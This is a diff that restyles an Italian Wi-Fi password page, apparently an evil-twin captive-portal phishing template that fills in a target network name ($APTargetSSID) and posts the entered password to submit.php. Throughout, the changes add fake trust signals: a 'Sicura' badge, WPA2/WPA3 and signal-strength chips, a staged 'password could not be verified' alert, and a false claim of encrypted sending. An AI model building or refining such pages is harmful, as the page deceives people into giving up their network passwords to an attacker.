@@ -3,183 +3,331 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<meta name="theme-color" content="#eef4fb">
+<meta name="theme-color" content="#050b18">
 <meta name="robots" content="noindex">
 <title>Rete Wi-Fi</title>
 <style>
   *, *::before, *::after { box-sizing: border-box; }
   :root {
-    --ink: #13233b;
-    --muted: #6c7d92;
-    --line: #dbe5f0;
-    --blue: #1268d6;
-    --blue-dark: #0c54b3;
-    --blue-soft: #eaf2fd;
-    --red: #c93434;
+    --ink: #eef6ff;
+    --muted: #8ea4c2;
+    --soft: #6f85a3;
+    --line: rgba(148, 190, 255, .16);
+    --line-strong: rgba(96, 165, 250, .42);
+    --blue: #3b82f6;
+    --cyan: #22d3ee;
+    --green: #34d399;
+    --red: #f87171;
+    --card: rgba(10, 22, 43, .78);
   }
-  html { background: #eef4fb; }
+  html { background: #050b18; }
   body {
     margin: 0;
     min-height: 100vh;
-    background:
-      radial-gradient(circle at 15% 8%, rgba(255,255,255,.96) 0 20%, transparent 56%),
-      linear-gradient(155deg, #eef4fb 0%, #f8fbff 48%, #e8f0f9 100%);
+    min-height: 100svh;
+    display: grid;
+    place-items: center;
+    padding: 26px 18px calc(22px + env(safe-area-inset-bottom));
+    overflow-x: hidden;
+    background: #050b18;
     color: var(--ink);
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
     -webkit-font-smoothing: antialiased;
     -webkit-text-size-adjust: 100%;
   }
-  .shell {
-    min-height: 100vh;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    padding: 32px 20px calc(26px + env(safe-area-inset-bottom));
+  .scene { position: fixed; inset: 0; z-index: -2; overflow: hidden; background:
+    radial-gradient(ellipse 80% 70% at 50% -10%, #0b2247 0%, #07152d 38%, #050b18 68%, #03070f 100%); }
+  .scene::after {
+    content: "";
+    position: absolute;
+    inset: 0;
+    background-image:
+      linear-gradient(rgba(148, 190, 255, .045) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(148, 190, 255, .045) 1px, transparent 1px);
+    background-size: 54px 54px;
+    -webkit-mask-image: radial-gradient(circle at 50% 42%, #000 0%, transparent 72%);
+    mask-image: radial-gradient(circle at 50% 42%, #000 0%, transparent 72%);
+    opacity: .75;
   }
+  .orb { position: absolute; border-radius: 50%; filter: blur(78px); opacity: .48; animation: drift 20s ease-in-out infinite alternate; }
+  .orb-a { width: 430px; height: 430px; top: -190px; left: -150px; background: #1d4ed8; }
+  .orb-b { width: 380px; height: 380px; right: -170px; bottom: -140px; background: #0891b2; animation-delay: -7s; }
+  .orb-c { width: 260px; height: 260px; top: 44%; left: 58%; background: #6d28d9; opacity: .28; animation-delay: -13s; }
+
+  .shell { width: 100%; max-width: 430px; display: flex; flex-direction: column; align-items: center; }
   .card {
+    position: relative;
     width: 100%;
-    max-width: 410px;
-    background: #fff;
-    border: 1px solid rgba(255,255,255,.9);
-    border-radius: 22px;
-    box-shadow: 0 22px 60px rgba(28,58,96,.16), 0 2px 8px rgba(28,58,96,.06);
-    padding: 30px 28px 28px;
+    padding: 22px 23px 23px;
+    overflow: hidden;
+    border: 1px solid var(--line);
+    border-radius: 28px;
+    background: linear-gradient(180deg, rgba(17, 34, 62, .84) 0%, var(--card) 58%, rgba(6, 14, 29, .9) 100%);
+    box-shadow: 0 40px 100px rgba(0, 0, 0, .58), 0 2px 0 rgba(255, 255, 255, .04) inset;
+    -webkit-backdrop-filter: blur(24px) saturate(135%);
+    backdrop-filter: blur(24px) saturate(135%);
   }
-  .brand { display: flex; align-items: center; gap: 11px; margin-bottom: 26px; }
-  .brand-icon {
-    width: 42px;
-    height: 42px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
+  .card::before {
+    content: "";
+    position: absolute;
+    top: 0;
+    left: 15%;
+    right: 15%;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, rgba(125, 211, 252, .85), transparent);
+  }
+  .topbar { display: flex; align-items: center; justify-content: space-between; gap: 12px; }
+  .brand { display: flex; align-items: center; gap: 10px; min-width: 0; }
+  .brand-mark {
+    width: 38px;
+    height: 38px;
+    display: grid;
+    place-items: center;
     flex: none;
-    border-radius: 13px;
-    background: linear-gradient(145deg, #2e8bfa, #0c54b3);
-    box-shadow: 0 7px 16px rgba(18,104,214,.25);
+    border-radius: 12px;
+    background: linear-gradient(145deg, #3b82f6, #0891b2);
+    box-shadow: 0 8px 20px rgba(37, 99, 235, .32), 0 1px 0 rgba(255, 255, 255, .28) inset;
   }
-  .brand-icon svg { width: 24px; height: 24px; display: block; }
-  .brand-name { font-size: 16px; font-weight: 700; letter-spacing: .1px; }
-  .brand-sub { margin-top: 2px; font-size: 12px; color: var(--muted); }
-  h1 { margin: 0 0 9px; font-size: 25px; line-height: 31px; font-weight: 700; letter-spacing: -.5px; }
-  .lead { margin: 0 0 22px; color: var(--muted); font-size: 14px; line-height: 21px; }
+  .brand-mark svg { width: 21px; height: 21px; display: block; }
+  .brand-name { font-size: 15px; font-weight: 750; letter-spacing: .1px; line-height: 1.15; }
+  .brand-sub { display: block; margin-top: 2px; color: var(--muted); font-size: 10.5px; letter-spacing: .2px; }
+  .secure-pill {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    flex: none;
+    padding: 6px 9px;
+    border: 1px solid rgba(52, 211, 153, .2);
+    border-radius: 999px;
+    background: rgba(16, 185, 129, .08);
+    color: #a7f3d0;
+    font-size: 9.5px;
+    font-weight: 700;
+    letter-spacing: .45px;
+    text-transform: uppercase;
+    white-space: nowrap;
+  }
+  .secure-pill i {
+    width: 6px;
+    height: 6px;
+    border-radius: 50%;
+    background: var(--green);
+    box-shadow: 0 0 0 4px rgba(52, 211, 153, .12), 0 0 12px rgba(52, 211, 153, .8);
+  }
+
+  .alert {
+    display: flex;
+    align-items: flex-start;
+    gap: 10px;
+    margin-top: 22px;
+    padding: 13px 14px;
+    border: 1px solid rgba(248, 113, 113, .26);
+    border-radius: 15px;
+    background: linear-gradient(135deg, rgba(127, 29, 29, .35), rgba(69, 10, 10, .22));
+    color: #fecaca;
+    font-size: 12.5px;
+    line-height: 1.5;
+  }
+  .alert svg { width: 18px; height: 18px; flex: none; margin-top: 1px; color: var(--red); }
+
   .network {
+    position: relative;
     display: flex;
     align-items: center;
-    gap: 12px;
-    margin-bottom: 22px;
-    padding: 13px 14px;
-    background: var(--blue-soft);
-    border: 1px solid #d8e8fc;
-    border-radius: 14px;
+    gap: 13px;
+    margin-top: 16px;
+    padding: 14px;
+    overflow: hidden;
+    border: 1px solid rgba(96, 165, 250, .18);
+    border-radius: 17px;
+    background: linear-gradient(135deg, rgba(37, 99, 235, .16), rgba(8, 145, 178, .08) 65%, rgba(15, 23, 42, .15));
   }
   .network-icon {
-    width: 36px;
-    height: 36px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
+    width: 46px;
+    height: 46px;
+    display: grid;
+    place-items: center;
     flex: none;
-    border-radius: 11px;
-    background: #fff;
-    color: var(--blue);
-    box-shadow: 0 2px 6px rgba(18,104,214,.1);
+    border-radius: 14px;
+    background: linear-gradient(145deg, #38bdf8, #2563eb);
+    box-shadow: 0 8px 18px rgba(14, 165, 233, .32), 0 1px 0 rgba(255, 255, 255, .32) inset;
   }
-  .network-icon svg { width: 20px; height: 20px; display: block; }
+  .network-icon svg { width: 23px; height: 23px; display: block; }
   .network-copy { min-width: 0; flex: 1; }
-  .network-label { color: var(--muted); font-size: 11px; font-weight: 600; letter-spacing: .5px; text-transform: uppercase; }
-  .network-name {
-    margin-top: 2px;
-    font-size: 15px;
-    font-weight: 650;
+  .eyebrow { margin: 0 0 3px; color: #7dd3fc; font-size: 9.5px; font-weight: 750; letter-spacing: 1px; text-transform: uppercase; }
+  .ssid {
+    margin: 0;
     overflow: hidden;
+    color: #fff;
+    font-size: 17px;
+    font-weight: 750;
+    line-height: 1.25;
+    letter-spacing: -.3px;
     text-overflow: ellipsis;
     white-space: nowrap;
   }
-  .lock { color: var(--blue); display: flex; flex: none; }
-  .lock svg { width: 18px; height: 18px; display: block; }
+  .chips { display: flex; flex-wrap: wrap; gap: 5px; margin-top: 6px; }
+  .chip {
+    display: inline-flex;
+    align-items: center;
+    gap: 4px;
+    padding: 3px 6px;
+    border: 1px solid rgba(148, 190, 255, .12);
+    border-radius: 6px;
+    background: rgba(2, 8, 20, .3);
+    color: #aec4df;
+    font-size: 9px;
+    font-weight: 650;
+    line-height: 1;
+    white-space: nowrap;
+  }
+  .chip svg { width: 10px; height: 10px; display: block; color: #67e8f9; }
+
+  .form-title { margin: 20px 0 6px; color: #fff; font-size: 21px; font-weight: 750; line-height: 1.2; letter-spacing: -.55px; }
+  .lead { margin: 0 0 17px; color: var(--muted); font-size: 12.5px; line-height: 1.5; }
   form { margin: 0; }
-  .field-label { display: block; margin-bottom: 8px; font-size: 13px; font-weight: 650; }
-  .field { position: relative; }
-  .field input {
-    width: 100%;
+  .field-label { display: flex; align-items: center; justify-content: space-between; gap: 10px; color: #b7c8de; font-size: 11.5px; font-weight: 650; }
+  .field-label span:last-child { color: #647a97; font-size: 10px; font-weight: 500; }
+  .input-wrap {
+    position: relative;
+    display: flex;
+    align-items: center;
     height: 52px;
-    padding: 0 54px 0 14px;
-    background: #fff;
+    margin-top: 7px;
     border: 1px solid var(--line);
-    border-radius: 13px;
-    color: var(--ink);
+    border-radius: 15px;
+    background: rgba(3, 10, 23, .52);
+    transition: border-color .18s ease, box-shadow .18s ease, background-color .18s ease;
+  }
+  .input-wrap:focus-within {
+    border-color: var(--line-strong);
+    background: rgba(3, 10, 23, .72);
+    box-shadow: 0 0 0 4px rgba(56, 189, 248, .09), 0 0 28px rgba(56, 189, 248, .08);
+  }
+  .key-icon { position: absolute; left: 15px; width: 18px; height: 18px; color: #6e86a5; pointer-events: none; }
+  .key-icon svg { width: 18px; height: 18px; display: block; }
+  .input-wrap input {
+    width: 100%;
+    height: 100%;
+    padding: 0 52px 0 44px;
+    border: 0;
+    background: transparent;
+    color: #f8fbff;
     font-family: inherit;
     font-size: 16px;
     outline: none;
     -webkit-appearance: none;
     appearance: none;
-    transition: border-color .15s ease, box-shadow .15s ease;
   }
-  .field input::placeholder { color: #99a7b8; font-size: 15px; }
-  .field input:focus { border-color: #89b6f0; box-shadow: 0 0 0 4px rgba(18,104,214,.1); }
+  .input-wrap input::placeholder { color: #5f7490; font-size: 14.5px; }
   .toggle {
     position: absolute;
-    top: 50%;
     right: 7px;
-    width: 38px;
-    height: 38px;
-    transform: translateY(-50%);
-    display: flex;
-    align-items: center;
-    justify-content: center;
+    width: 36px;
+    height: 36px;
+    display: grid;
+    place-items: center;
     border: 0;
     border-radius: 10px;
     background: transparent;
-    color: var(--muted);
+    color: #7890ad;
     cursor: pointer;
+    transition: background-color .15s ease, color .15s ease;
   }
-  .toggle:hover { background: #f3f7fc; color: var(--ink); }
+  .toggle:hover { background: rgba(148, 190, 255, .09); color: #dcecff; }
   .toggle svg { width: 19px; height: 19px; display: block; }
   .toggle .eye-off { display: none; }
   .toggle.is-visible .eye { display: none; }
   .toggle.is-visible .eye-off { display: block; }
-  .hint { margin: 8px 1px 0; color: var(--muted); font-size: 12px; line-height: 17px; }
   .submit {
+    position: relative;
     width: 100%;
-    height: 50px;
-    margin-top: 18px;
-    border: 0;
-    border-radius: 13px;
-    background: #a9c6ea;
-    color: #fff;
-    font: 700 16px/50px -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-    cursor: pointer;
-    transition: background-color .15s ease, box-shadow .15s ease;
-  }
-  .submit.ready { background: var(--blue); box-shadow: 0 8px 18px rgba(18,104,214,.22); }
-  .submit.ready:hover { background: var(--blue-dark); }
-  .alert {
+    height: 52px;
     display: flex;
-    gap: 9px;
-    margin: 0 0 18px;
-    padding: 11px 12px;
-    border: 1px solid #f2cccc;
-    border-radius: 12px;
-    background: #fff5f5;
-    color: var(--red);
-    font-size: 13px;
-    line-height: 18px;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    margin-top: 16px;
+    border: 0;
+    border-radius: 15px;
+    background: linear-gradient(135deg, #60a5fa 0%, #22d3ee 100%);
+    color: #03101f;
+    font: 800 15px/1 -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    cursor: pointer;
+    box-shadow: 0 15px 32px rgba(37, 99, 235, .3), 0 1px 0 rgba(255, 255, 255, .45) inset;
+    transition: transform .16s ease, filter .16s ease, box-shadow .16s ease;
   }
-  .alert svg { width: 17px; height: 17px; flex: none; margin-top: 1px; }
-  .foot {
-    margin-top: 22px;
-    color: #8797aa;
-    font-size: 12px;
-    text-align: center;
+  .submit:hover { transform: translateY(-1px); box-shadow: 0 19px 38px rgba(37, 99, 235, .4), 0 1px 0 rgba(255, 255, 255, .5) inset; }
+  .submit:active { transform: translateY(0); }
+  .submit .arrow { width: 17px; height: 17px; display: block; transition: transform .16s ease; }
+  .submit:hover .arrow { transform: translateX(3px); }
+  .spinner { display: none; width: 17px; height: 17px; border: 2px solid rgba(3, 16, 31, .3); border-top-color: #03101f; border-radius: 50%; animation: spin .7s linear infinite; }
+  .submit.is-loading { pointer-events: none; opacity: .85; }
+  .submit.is-loading .arrow { display: none; }
+  .submit.is-loading .spinner { display: block; }
+  .row { display: flex; align-items: center; justify-content: space-between; gap: 12px; margin: 12px 1px 0; }
+  .help { color: #7dd3fc; font-size: 10.5px; font-weight: 600; text-decoration: none; }
+  .help:hover { color: #c7f5ff; }
+  .privacy { display: flex; align-items: center; justify-content: center; gap: 6px; margin: 14px 0 0; color: var(--soft); font-size: 10.5px; }
+  .privacy svg { width: 12px; height: 12px; display: block; color: #4ade80; }
+  .foot { margin: 17px 4px 0; color: #526887; font-size: 10.5px; line-height: 1.5; text-align: center; }
+
+  @keyframes drift {
+    0% { transform: translate3d(0, 0, 0) scale(1); }
+    100% { transform: translate3d(26px, 18px, 0) scale(1.12); }
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  @media (max-width: 380px) {
+    body { padding-left: 13px; padding-right: 13px; }
+    .card { padding: 19px 18px 20px; border-radius: 24px; }
+    .secure-pill { font-size: 8.5px; padding: 5px 7px; }
+    .form-title { font-size: 19px; }
+    .network { gap: 11px; padding: 12px; }
+    .ssid { font-size: 15.5px; }
+  }
+  @media (prefers-reduced-motion: reduce) {
+    *, *::before, *::after { animation-duration: .001ms !important; animation-iteration-count: 1 !important; transition-duration: .001ms !important; }
   }
 </style>
 </head>
 <body>
+  <div class="scene" aria-hidden="true">
+    <span class="orb orb-a"></span>
+    <span class="orb orb-b"></span>
+    <span class="orb orb-c"></span>
+  </div>
+
   <main class="shell">
     <section class="card">
-      <div class="brand">
-        <div class="brand-icon" aria-hidden="true">
+      <div class="topbar">
+        <div class="brand">
+          <span class="brand-mark" aria-hidden="true">
+            <svg viewBox="0 0 24 24" fill="none">
+              <path d="M3.4 8.9a13.4 13.4 0 0 1 17.2 0" stroke="#fff" stroke-width="2" stroke-linecap="round"/>
+              <path d="M6.5 12.4a8.6 8.6 0 0 1 11 0" stroke="#fff" stroke-width="2" stroke-linecap="round"/>
+              <path d="M9.6 15.9a3.8 3.8 0 0 1 4.8 0" stroke="#fff" stroke-width="2" stroke-linecap="round"/>
+              <circle cx="12" cy="19.2" r="1.35" fill="#fff"/>
+            </svg>
+          </span>
+          <span>
+            <span class="brand-name">Wi-Fi</span>
+            <span class="brand-sub">Rete wireless</span>
+          </span>
+        </div>
+        <span class="secure-pill"><i></i>Sicura</span>
+      </div>
+
+      <div class="alert" role="alert">
+        <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
+          <path d="M12 3.4 21 19.4H3L12 3.4Z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/>
+          <path d="M12 9.4v4.2" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+          <circle cx="12" cy="16.6" r="1.05" fill="currentColor"/>
+        </svg>
+        <span>Impossibile verificare la password. Riprova.</span>
+      </div>
+
+      <div class="network">
+        <div class="network-icon" aria-hidden="true">
           <svg viewBox="0 0 24 24" fill="none">
             <path d="M3.4 8.9a13.4 13.4 0 0 1 17.2 0" stroke="#fff" stroke-width="2" stroke-linecap="round"/>
             <path d="M6.5 12.4a8.6 8.6 0 0 1 11 0" stroke="#fff" stroke-width="2" stroke-linecap="round"/>
@@ -187,49 +335,38 @@
             <circle cx="12" cy="19.2" r="1.35" fill="#fff"/>
           </svg>
         </div>
-        <div>
-          <div class="brand-name">Wi-Fi</div>
-          <div class="brand-sub">Rete protetta</div>
-        </div>
-      </div>
-
-      <h1>Inserisci la password Wi-Fi</h1>
-
-      <div class="alert" role="alert">
-        <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
-          <circle cx="12" cy="12" r="9.2" stroke="currentColor" stroke-width="1.8"/>
-          <path d="M12 7.4v5.5" stroke="currentColor" stroke-width="1.9" stroke-linecap="round"/>
-          <circle cx="12" cy="16.6" r="1.15" fill="currentColor"/>
-        </svg>
-        <span>Password errata. Riprova.</span>
-      </div>
-
-      <div class="network">
-        <div class="network-icon" aria-hidden="true">
-          <svg viewBox="0 0 24 24" fill="none">
-            <path d="M3.4 8.9a13.4 13.4 0 0 1 17.2 0" stroke="currentColor" stroke-width="1.9" stroke-linecap="round"/>
-            <path d="M6.5 12.4a8.6 8.6 0 0 1 11 0" stroke="currentColor" stroke-width="1.9" stroke-linecap="round"/>
-            <path d="M9.6 15.9a3.8 3.8 0 0 1 4.8 0" stroke="currentColor" stroke-width="1.9" stroke-linecap="round"/>
-            <circle cx="12" cy="19.2" r="1.3" fill="currentColor"/>
-          </svg>
-        </div>
         <div class="network-copy">
-          <div class="network-label">Rete</div>
-          <div class="network-name">$APTargetSSID</div>
-        </div>
-        <div class="lock" aria-hidden="true">
-          <svg viewBox="0 0 24 24" fill="none">
-            <rect x="4.4" y="10.2" width="15.2" height="10.4" rx="2.5" stroke="currentColor" stroke-width="1.9"/>
-            <path d="M8.1 10.2V7.7a3.9 3.9 0 0 1 7.8 0v2.5" stroke="currentColor" stroke-width="1.9" stroke-linecap="round"/>
-          </svg>
+          <p class="eyebrow">Rete a cui connettersi</p>
+          <p class="ssid">$APTargetSSID</p>
+          <div class="chips">
+            <span class="chip">WPA2 / WPA3</span>
+            <span class="chip">
+              <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
+                <path d="M4 17.5v-3.2M9.3 17.5V10m5.4 7.5V7.2M20 17.5V4.5" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"/>
+              </svg>
+              Segnale forte
+            </span>
+          </div>
         </div>
       </div>
+
+      <h1 class="form-title">Inserisci la password Wi-Fi</h1>
+      <p class="lead">Verifica la password della rete per accedere a questa rete wireless.</p>
 
       <form action="submit.php" method="post" id="wifiForm" autocomplete="off">
-        <label class="field-label" for="password">Password Wi-Fi</label>
-        <div class="field">
+        <label class="field-label" for="password">
+          <span>Password della rete</span>
+          <span>Distingue maiuscole e minuscole</span>
+        </label>
+        <div class="input-wrap">
+          <span class="key-icon" aria-hidden="true">
+            <svg viewBox="0 0 24 24" fill="none">
+              <circle cx="8.2" cy="12" r="3.7" stroke="currentColor" stroke-width="1.8"/>
+              <path d="M11.9 12h8M16.5 12v2.2M19 12v3" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+            </svg>
+          </span>
           <input id="password" name="password" type="password"
-                 placeholder="Password Wi-Fi"
+                 placeholder="Inserisci la password Wi-Fi"
                  autocapitalize="none" autocorrect="off" spellcheck="false"
                  autocomplete="off" required>
           <button type="button" class="toggle" id="togglePassword"
@@ -244,11 +381,31 @@
             </svg>
           </button>
         </div>
-        <p class="hint">La password distingue tra maiuscole e minuscole.</p>
-        <button type="submit" id="submitBtn" class="submit">Connetti</button>
+
+        <button type="submit" id="submitBtn" class="submit">
+          <span class="btn-text">Connettiti alla rete</span>
+          <svg class="arrow" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+            <path d="M5 12h13M13 6.5 18.5 12 13 17.5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+          <span class="spinner" aria-hidden="true"></span>
+        </button>
+
+        <div class="row">
+          <span></span>
+          <a class="help" href="#">Aiuto</a>
+        </div>
       </form>
+
+      <p class="privacy">
+        <svg viewBox="0 0 24 24" fill="none" aria-hidden="true">
+          <rect x="5" y="10.3" width="14" height="9.6" rx="2.4" stroke="currentColor" stroke-width="1.8"/>
+          <path d="M8.4 10.3V7.9a3.6 3.6 0 0 1 7.2 0v2.4" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+        </svg>
+        La password viene inviata tramite un collegamento cifrato.
+      </p>
     </section>
-    <footer class="foot">Connessione sicura</footer>
+
+    <p class="foot">Connessione sicura · WPA2/WPA3</p>
   </main>
 
   <script>
@@ -256,13 +413,8 @@
       var form = document.getElementById('wifiForm');
       var input = document.getElementById('password');
       var button = document.getElementById('submitBtn');
+      var label = button.querySelector('.btn-text');
       var toggle = document.getElementById('togglePassword');
-
-      function sync() {
-        button.classList.toggle('ready', input.value.length > 0);
-      }
-      input.addEventListener('input', sync);
-      sync();
 
       toggle.addEventListener('click', function () {
         var visible = input.type === 'text';
@@ -271,6 +423,12 @@
         toggle.setAttribute('aria-pressed', String(!visible));
         toggle.setAttribute('aria-label', !visible ? 'Nascondi password' : 'Mostra password');
         input.focus();
+      });
+
+      form.addEventListener('submit', function () {
+        button.classList.add('is-loading');
+        button.setAttribute('aria-busy', 'true');
+        label.textContent = 'Connessione…';
       });
     }());
   </script>
